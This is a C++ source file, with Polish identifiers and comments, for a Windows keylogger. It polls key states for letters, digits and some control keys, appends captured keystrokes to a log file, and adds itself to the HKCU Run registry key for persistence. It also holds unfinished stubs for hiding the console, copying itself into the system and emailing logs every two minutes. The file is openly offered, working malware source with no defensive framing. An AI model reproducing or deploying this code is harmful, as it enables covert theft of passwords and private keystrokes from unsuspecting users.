#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <cstring>

using namespace std;

bool antyDuplikacja()
{
    CreateMutex(NULL, TRUE, "5da64e2b2ed82f3ac144d1a87f78b16ahakeredupl");
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        return true;
    }
    else
    {
        return false;
    }
}

void ukryjKonsole()
{
    //FreeConsole();
}

void dodajDoAutostartu(string sciezka)
{
    string komenda = "reg ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v KeyloggerTEST /t REG_SZ /d ";
    komenda.append(sciezka);
    cout << komenda << endl;
    system(komenda.c_str());
    //Zaimplementuj dodawanie do autostartu
}

void kopiujDoSystemu()
{
    //Kopiowanie keylogger.exe do folderu gdzies w systemie
}

void wyslijMaila()
{
    //Zaimplementuj wyslij logi co 2 minuty
}

void zapiszLogi(int liczba)
{
    FILE * plik;
    plik = fopen("logi.txt", "a");
    if (plik!=NULL)
    {
        fputc((char)liczba, plik);
        fclose(plik);
    }
}

void wlaczKeyloggera()
{
    int liczba;
    int tymczasowa;

    while(true)
    {
        //ZCZYTUJE A-Z
        for(liczba=65; liczba<91; liczba++)
        {
            tymczasowa = GetAsyncKeyState(liczba);

            if (tymczasowa==-32767 && !GetAsyncKeyState(VK_SHIFT))
            {
                cout << (char)(liczba+32);
                zapiszLogi((liczba+32));
            }
            else if (tymczasowa==-32767 && GetAsyncKeyState(VK_SHIFT))
            {
                cout << (char)liczba;
                zapiszLogi(liczba);
            }

        }

        //ZCZYTUJE LICZBY
        for(liczba=48; liczba<58; liczba++)
        {
            if (GetAsyncKeyState(liczba)==-32767)
            {
                cout << (char)liczba;
                zapiszLogi(liczba);
            }
        }

        if (GetAsyncKeyState(VK_SPACE)==-32767)
        {
            cout << " ";
            zapiszLogi(32);
        }

        if (GetAsyncKeyState(VK_RETURN)==-32767)
        {
            cout << "[ENTER]";
        }

        if (GetAsyncKeyState(VK_BACK)==-32767)
        {
            cout << "[BS]";
            zapiszLogi(8);
        }

        if (GetAsyncKeyState(VK_DELETE)==-32767)
        {
            cout << "[DEL]";
        }

        if (GetAsyncKeyState(VK_TAB)==-32767)
        {
            cout << "[DEL]";
        }
    }
}

int main()
{
    if (!antyDuplikacja())
    {
        ukryjKonsole();
        dodajDoAutostartu("C:\\keylogger\\");
        kopiujDoSystemu();
        wlaczKeyloggera();
    }
    return 0;
}